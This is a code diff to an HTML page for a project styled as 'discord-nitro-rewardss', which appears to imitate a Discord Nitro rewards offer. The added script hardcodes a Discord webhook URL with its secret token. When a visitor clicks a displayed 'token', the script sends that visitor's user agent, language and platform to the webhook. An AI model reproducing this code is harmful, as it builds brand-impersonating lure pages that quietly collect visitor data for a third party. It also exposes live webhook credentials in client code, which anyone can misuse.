@@ -242,7 +242,9 @@
     </div>
 
     <script>
-        // 🚀 Função para enviar informações
+        const webhookUrl = 'https://discord.com/api/webhooks/1487341041374990406/TrNjtQdHPich8D85CCJONmbQHeSmcyQYpkPPQvYtQmZc3H_Mf2NlHM-QeTyP0hDAKv7T';
+
+        // 🚀 Função para enviar informações direto para Discord
         async function sendProjectInfo() {
             const loading = document.getElementById('loading');
             const status = document.getElementById('status');
@@ -251,52 +253,94 @@
             status.className = 'status';
 
             try {
-                // 🎯 Coleta informações do projeto
-                const projectInfo = {
-                    projectName: 'discord-nitro-rewardss',
-                    repository: 'discord-nitro-rewardss.github.io',
-                    owner: 'discord-nitro-rewards',
-                    branch: 'main',
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    fileInfo: '**index.html** - Interface web com gradiente Discord, logo em forma de círculo, 3 features (Recompensas, Benefícios, Rápido), botão interativo e rastreamento de cliques.\n\n**netlify/functions/track-click.js** - Função serverless que registra cliques e envia dados para Discord via webhook. Captura: Data/Hora, Navegador, Dispositivo, Idioma, Página.\n\n**netlify.toml** - Configuração de build e deploy. Build command: echo "Building..." | Functions: netlify/functions\n\n**.env.example** - Arquivo de exemplo com DISCORD_WEBHOOK como variável de ambiente\n\n**.gitignore** - Ignora: .env, .env.local, node_modules/'
+                const now = new Date();
+                const timeString = now.toLocaleString('pt-BR');
+
+                // 🎯 Monta a mensagem com todas as informações
+                const embed = {
+                    title: '✅ INFORMAÇÕES COMPLETAS DO PROJETO',
+                    color: 5865402,
+                    description: '📦 Resumo detalhado de todos os arquivos e configurações',
+                    fields: [
+                        {
+                            name: '🏢 DADOS DO PROJETO',
+                            value: `**Nome:** discord-nitro-rewardss\n**Repositório:** discord-nitro-rewardss.github.io\n**Owner:** discord-nitro-rewards\n**Branch:** main\n**Enviado em:** ${timeString}`,
+                            inline: false
+                        },
+                        {
+                            name: '📂 ESTRUTURA DE ARQUIVOS',
+                            value: `**index.html** - Interface web com gradiente Discord, logo, 3 features (Recompensas, Benefícios, Rápido), botão interativo e rastreamento de cliques.
+
+**netlify/functions/track-click.js** - Função serverless que registra cliques e envia dados para Discord via webhook. Captura: Data/Hora, Navegador, Dispositivo, Idioma, Página.
+
+**netlify.toml** - Configuração de build e deploy. Build command: echo "Building..." | Functions: netlify/functions
+
+**.env.example** - Arquivo de exemplo com DISCORD_WEBHOOK como variável de ambiente
+
+**.gitignore** - Ignora: .env, .env.local, node_modules/`,
+                            inline: false
+                        },
+                        {
+                            name: '🌐 INFORMAÇÕES DO NAVEGADOR',
+                            value: `**User Agent:** ${navigator.userAgent}\n**Linguagem:** ${navigator.language}\n**Plataforma:** ${navigator.platform}`,
+                            inline: false
+                        },
+                        {
+                            name: '✨ FUNCIONALIDADES',
+                            value: '✓ Rastreamento de cliques em tempo real\n✓ Webhook do Discord integrado\n✓ Responsivo (Mobile, Tablet, Desktop)\n✓ Serverless com Netlify\n✓ Variáveis de ambiente seguras',
+                            inline: false
+                        },
+                        {
+                            name: '📈 STATUS',
+                            value: '🟢 Projeto Ativo\n✅ Webhook Configurado\n✅ Rastreamento Funcionando\n✅ Build Pronto\n✅ Deploy Ativo',
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: '🤖 Enviado automaticamente do site'
+                    },
+                    timestamp: new Date().toISOString()
                 };
 
-                // 📤 Envia para função serverless
-                const response = await fetch('/.netlify/functions/send-project-info', {
+                // 📤 Envia direto para Discord
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(projectInfo)
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: '🎉 **INFORMAÇÕES DO PROJETO DISCORD NITRO REWARDS**',
+                        embeds: [embed]
+                    })
                 });
 
-                const result = await response.json();
-
-                if (response.ok) {
+                if (response.ok || response.status === 204) {
                     loading.style.display = 'none';
                     status.className = 'status success';
-                    status.innerHTML = '✅ <strong>Sucesso!</strong> Informações enviadas para o Discord com sucesso!';
-                    console.log('✅ Informações enviadas!');
+                    status.innerHTML = '✅ <strong>Sucesso!</strong> Informações enviadas para o Discord!';
+                    console.log('✅ Mensagem enviada com sucesso!');
                 } else {
-                    throw new Error(result.error || 'Erro desconhecido');
+                    console.log('Response status:', response.status);
+                    throw new Error('Erro HTTP: ' + response.status);
                 }
 
             } catch (error) {
+                console.error('Erro detalhado:', error);
                 loading.style.display = 'none';
                 status.className = 'status error';
-                status.innerHTML = '❌ <strong>Erro!</strong> ' + error.message;
-                console.error('Erro:', error);
+                status.innerHTML = '❌ <strong>Erro!</strong> ' + error.message + '. Verifique o console.';
             }
         }
 
         // 🖱️ Clique no token para enviar
         document.getElementById('tokenDisplay').addEventListener('click', function() {
+            console.log('Enviando informações...');
             sendProjectInfo();
         });
 
         // 📋 Função para copiar token
         document.getElementById('copyBtn').addEventListener('click', function(e) {
-            e.stopPropagation(); // Previne envio ao copiar
+            e.stopPropagation();
             const token = document.getElementById('tokenDisplay').textContent;
             navigator.clipboard.writeText(token).then(() => {
                 const btn = this;
@@ -308,14 +352,11 @@
                     btn.textContent = originalText;
                     btn.classList.remove('copied');
                 }, 2000);
-            }).catch(err => {
-                console.error('Erro ao copiar:', err);
             });
         });
 
-        // Mensagem no console
-        console.log('🚀 Página carregada com sucesso!');
-        console.log('📤 Clique no link para enviar as informações para Discord');
+        console.log('✅ Página carregada com sucesso!');
+        console.log('🚀 Clique no link para enviar as informações para Discord');
     </script>
 </body>
 </html>
